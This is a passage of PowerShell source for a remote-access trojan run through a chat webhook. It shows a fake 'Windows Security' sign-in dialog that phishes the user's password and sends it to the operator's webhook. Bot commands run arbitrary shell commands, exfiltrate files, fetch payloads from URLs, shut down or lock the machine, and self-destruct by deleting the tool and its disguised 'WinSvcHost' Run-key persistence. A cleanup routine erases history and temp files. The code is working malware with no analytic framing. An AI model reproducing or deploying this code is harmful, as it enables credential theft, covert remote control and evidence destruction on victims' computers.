                        param($root,$tid,$webhook,$victim)
                        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                        $overlays = @()
                        foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
                            $f = New-Object System.Windows.Forms.Form
                            $f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'
                            $f.BackColor = 'Black'; $f.Opacity = 0.6
                            $f.TopMost = $true; $f.ShowInTaskbar = $false
                            $f.StartPosition = 'Manual'
                            $f.Location = $s.Bounds.Location; $f.Size = $s.Bounds.Size
                            $f.Show(); $overlays += $f
                        }
                        [System.Windows.Forms.Application]::DoEvents()
                        $form = New-Object System.Windows.Forms.Form
                        $form.Text = 'Windows Security'
                        $form.Size = New-Object System.Drawing.Size(420,260)
                        $form.StartPosition = 'CenterScreen'
                        $form.FormBorderStyle = 'FixedDialog'
                        $form.TopMost = $true; $form.BackColor = 'White'
                        $lbl = New-Object System.Windows.Forms.Label
                        $lbl.Text = 'Your session has expired. Please sign in to continue.'
                        $lbl.Location = New-Object System.Drawing.Point(20,20)
                        $lbl.Size = New-Object System.Drawing.Size(370,50)
                        $form.Controls.Add($lbl)
                        $txtU = New-Object System.Windows.Forms.TextBox
                        $txtU.Location = New-Object System.Drawing.Point(110,90)
                        $txtU.Size = New-Object System.Drawing.Size(270,22)
                        $txtU.Text = "$env:USERDOMAIN\$env:USERNAME"
                        $form.Controls.Add($txtU)
                        $txtP = New-Object System.Windows.Forms.TextBox
                        $txtP.Location = New-Object System.Drawing.Point(110,125)
                        $txtP.Size = New-Object System.Drawing.Size(270,22)
                        $txtP.UseSystemPasswordChar = $true
                        $form.Controls.Add($txtP)
                        $btn = New-Object System.Windows.Forms.Button
                        $btn.Text = 'Sign in'
                        $btn.Location = New-Object System.Drawing.Point(290,160)
                        $btn.Size = New-Object System.Drawing.Size(90,30)
                        $form.Controls.Add($btn)
                        $script:captured = $false
                        $btn.Add_Click({
                            if ($txtP.Text.Length -gt 0) {
                                $script:capU = $txtU.Text; $script:capP = $txtP.Text
                                $script:captured = $true; $form.Close()
                            }
                        })
                        $form.AcceptButton = $btn
                        [void]$form.ShowDialog()
                        foreach ($o in $overlays) { $o.Close(); $o.Dispose() }
                        if ($script:captured) {
                            $entry = "[$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')] $env:COMPUTERNAME | $script:capU : $script:capP"
                            $body = @{ content = "🔑 **CREDS CAPTURED**`n``````$entry``````"; username = $victim } | ConvertTo-Json -Compress
                            try { Invoke-RestMethod -Uri "$webhook`?thread_id=$tid" -Method Post -ContentType 'application/json' -Body $body } catch {}
                        }
                    } -ArgumentList $ROOT,$TID,$WEBHOOK,$VICTIM | Out-Null
                }

                '^!creds$' {
                    if (Test-Path $CREDFILE) { Invoke-Hook -Content "🔑 Cred dump" -ThreadId $TID -FilePath $CREDFILE | Out-Null }
                    else { Invoke-Bot -Content "No creds yet. Try ``!credz``" | Out-Null }
                }

                '^!clean$' {
                    Clean-Exfil
                    Invoke-Bot -Content "🧽 Cleaned temp/history/recycle." | Out-Null
                }

                '^!shell\s+(.+)$' {
                    $cmd = $matches[1]
                    $o = try { (Invoke-Expression $cmd 2>&1 | Out-String) } catch { $_.Exception.Message }
                    if ($o.Length -gt 1800) { $o = $o.Substring(0,1800) + "`n...[truncated]" }
                    Invoke-Bot -Content "**``$cmd``**`n``````$o``````" | Out-Null
                }

                '^!download\s+(.+)$' {
                    $p = $matches[1].Trim()
                    if (Test-Path $p) { Invoke-Hook -Content "📎 ``$p``" -ThreadId $TID -FilePath $p | Out-Null }
                    else { Invoke-Bot -Content "Not found: ``$p``" | Out-Null }
                }

                '^!upload\s+(\S+)\s+(.+)$' {
                    $url = $matches[1]; $dst = $matches[2]
                    try { Invoke-WebRequest $url -OutFile $dst -UseBasicParsing; Invoke-Bot -Content "✅ Uploaded to ``$dst``" | Out-Null }
                    catch { Invoke-Bot -Content "❌ Upload failed: $($_.Exception.Message)" | Out-Null }
                }

                '^!shutdown$' { Invoke-Bot -Content "⏻ Shutting down." | Out-Null; shutdown /s /t 3 }
                '^!reboot$'   { Invoke-Bot -Content "🔄 Rebooting." | Out-Null; shutdown /r /t 3 }
                '^!lock$'     { rundll32 user32.dll,LockWorkStation }

                '^!kill\s+(.+)$' {
                    $cfg.kill_at = $matches[1]
                    $cfg | ConvertTo-Json | Set-Content $CFG -Force
                    Invoke-Bot -Content "💀 Killswitch set: $($cfg.kill_at)" | Out-Null
                }

                '^!selfdestruct$' {
                    Invoke-Hook -Content "💥 Self-destruct." -ThreadId $TID | Out-Null
                    Remove-Item $ROOT -Recurse -Force -EA 0
                    Remove-Item $vbs -Force -EA 0
                    Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSvcHost' -EA 0
                    exit
                }
            }
        }
    } catch {}
    Start-Sleep -Seconds $POLLSEC
}